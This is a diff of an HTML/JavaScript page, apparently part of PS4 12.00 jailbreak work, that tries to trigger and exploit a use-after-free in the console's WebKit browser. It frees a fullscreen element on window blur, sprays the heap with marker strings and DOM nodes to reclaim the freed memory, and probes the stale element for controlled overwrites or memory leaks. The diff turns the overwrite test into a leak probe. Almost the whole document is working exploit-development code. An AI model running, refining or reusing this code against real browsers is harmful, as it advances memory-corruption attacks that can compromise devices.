@@ -1,45 +1,45 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (Controlled Overwrite)</title>
+<title>UAF Leak Amplification</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF Aggressive Reclaim - Controlled Overwrite</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 let logBuffer = [];
 
-function log(msg){
-    try{console.log(msg);}catch(e){}
-    logBuffer.push(msg);
+function log(m){
+    try{console.log(m);}catch(e){}
+    logBuffer.push(m);
 }
 
 // ==========================
-// HEAP SETUP (INALTERADO)
+// HEAP SETUP
 // ==========================
 function setupHeap(){
-    let arr=[];
+    let a=[];
     for(let i=0;i<5000;i++){
-        let a=new Float64Array(8);
-        a[0]=i;
-        arr.push(a);
+        let x=new Float64Array(8);
+        x[0]=i;
+        a.push(x);
     }
-    return arr;
+    return a;
 }
 
 // ==========================
 // FULLSCREEN
 // ==========================
-function setupFullscreen(){
+function setupFS(){
     let fs=document.createElement("div");
 
-    fs.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fs.innerHTML="<h1>FULLSCREEN</h1>";
 
-    fs.style.cssText="background:black;width:100%;height:100%;position:absolute;top:0;left:0;";
+    fs.style.cssText="position:absolute;width:100%;height:100%;background:black";
 
     document.body.appendChild(fs);
 
@@ -49,98 +49,74 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 AGGRESSIVE RECLAIM (REFINADO)
+// 💣 RECLAIM (LEAK MODE)
 // ==========================
-function aggressiveReclaim(){
+function reclaim(){
 
-    log("[*] Aggressive reclaim iniciado");
+    log("[*] Reclaim start");
 
     let bucket=[];
 
-    // churn
+    // 🔥 LONG STRING SPRAY
     for(let i=0;i<8000;i++){
-        let e=document.createElement("div");
-        document.body.appendChild(e);
-        e.remove();
-    }
 
-    // 🔥 CONTROL STRING SPRAY
-    for(let i=0;i<10000;i++){
         let e=document.createElement("div");
 
-        // marcador forte
-        e.innerHTML="CTRL_"+i+"_41414141_42424242_43434343";
+        let pattern = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE";
+
+        e.innerHTML = "HDR_"+i+"_"+pattern.repeat(8);
 
         document.body.appendChild(e);
         bucket.push(e);
     }
 
     // TEXT spray
-    for(let i=0;i<10000;i++){
-        let t=document.createTextNode("TXT_"+i+"_BBBBBBBBBBBBBBBB");
+    for(let i=0;i<8000;i++){
+        let t=document.createTextNode(
+            "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        );
         document.body.appendChild(t);
         bucket.push(t);
     }
 
-    // ATTRIBUTE spray
-    for(let i=0;i<10000;i++){
-        let e=document.createElement("div");
-        e.setAttribute("data-x","ATTR_"+i+"_CCCCCCCC");
-        document.body.appendChild(e);
-        bucket.push(e);
-    }
-
-    log("[*] Aggressive reclaim finalizado: "+bucket.length);
+    log("[*] Reclaim end: "+bucket.length);
 
     return bucket;
 }
 
 // ==========================
-// 🔬 CHECK REAL
+// 🔬 LEAK PROBE
 // ==========================
-function checkUAF(fs){
+function probe(fs){
 
-    log("---- UAF CHECK ----");
+    log("---- PROBE ----");
 
     try{
-        let v=fs.innerHTML;
+        let s = fs.innerHTML;
 
-        log("[CHECK] innerHTML = "+v);
+        log("[LEN] "+(s ? s.length : "null"));
+        log("[VAL] "+s);
 
-        if(v &&
-           (v.includes("4141") ||
-            v.includes("4242") ||
-            v.includes("4343"))){
+        if(s){
 
-            log("[!!!] OVERWRITE CONTROLADO DETECTADO");
-        }
+            if(s.includes("AAAA")) log("[HIT] A");
+            if(s.includes("BBBB")) log("[HIT] B");
+            if(s.includes("CCCC")) log("[HIT] C");
 
-        if(v && v.length <= 2){
-            log("[!!!] STRING CORROMPIDA (CURTA)");
+            if(s.length > 20){
+                log("[!!!] POSSIVEL OVERREAD / OVERLAP");
+            }
+
         }
 
     }catch(e){
-        log("[UAF] innerHTML crash");
+        log("[CRASH] read");
     }
 
-    try{
-        log("[CHECK] parent = "+fs.parentNode);
-    }catch(e){}
-
-    try{
-        log("[CHECK] layout = "+fs.offsetTop);
-    }catch(e){}
-
-    try{
-        fs.innerHTML="A";
-        log("[CHECK] write OK");
-    }catch(e){
-        log("[UAF] write crash");
-    }
 }
 
 // ==========================
-// TRIGGER (INALTERADO)
+// TRIGGER
 // ==========================
 function trigger(fs){
 
@@ -148,20 +124,16 @@ function trigger(fs){
 
     try{
         fs.remove();
-
-        if(document.webkitIsFullScreen){
-            document.webkitExitFullscreen?.();
-        }
-
+        document.webkitExitFullscreen?.();
     }catch(e){}
 
-    setTimeout(()=>aggressiveReclaim(),0);
-    setTimeout(()=>aggressiveReclaim(),50);
-    setTimeout(()=>aggressiveReclaim(),100);
+    setTimeout(()=>reclaim(),0);
+    setTimeout(()=>reclaim(),50);
+    setTimeout(()=>reclaim(),100);
 
-    setTimeout(()=>checkUAF(fs),100);
-    setTimeout(()=>checkUAF(fs),200);
-    setTimeout(()=>checkUAF(fs),300);
+    setTimeout(()=>probe(fs),120);
+    setTimeout(()=>probe(fs),200);
+    setTimeout(()=>probe(fs),300);
 
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
@@ -175,15 +147,14 @@ function trigger(fs){
 // ==========================
 function runTest(){
 
-    log("[*] Iniciando teste");
+    log("[*] Start");
 
     setupHeap();
 
-    let fs=setupFullscreen();
+    let fs = setupFS();
 
-    window.onblur=function(){
+    window.onblur = ()=>{
         log("[*] onblur");
-
         setTimeout(()=>trigger(fs),3000);
     };
 }
